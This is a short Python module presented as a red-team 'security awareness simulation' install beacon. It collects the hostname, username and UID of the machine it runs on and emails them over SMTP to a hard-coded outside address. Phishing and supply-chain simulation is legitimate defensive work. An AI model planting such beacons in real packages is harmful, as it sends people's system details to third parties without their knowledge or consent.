"""
Security awareness simulation hook — this file is intentionally visible
so participants can inspect exactly what was collected after reading the alert.
"""
import os
import socket
import smtplib
from email.mime.text import MIMEText

ALERT_TO = "sjayashankar@sofi.org"


def collect_and_notify(smtp_host, smtp_port, smtp_user, smtp_pass, smtp_from):
    hostname = socket.gethostname()
    username = os.environ.get("USER") or os.environ.get("USERNAME") or "unknown"
    uid      = str(os.getuid()) if hasattr(os, "getuid") else "n/a"

    body = (
        "Security Simulation — Install Beacon\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Hostname : {hostname}\n"
        f"Username : {username}\n"
        f"UID      : {uid}\n"
    )
    msg = MIMEText(body)
    msg["Subject"] = "[Red Team Sim] Package install beacon received"
    msg["From"]    = smtp_from
    msg["To"]      = ALERT_TO

    with smtplib.SMTP(smtp_host, smtp_port) as s:
        s.starttls()
        s.login(smtp_user, smtp_pass)
        s.sendmail(smtp_from, [ALERT_TO], msg.as_string())
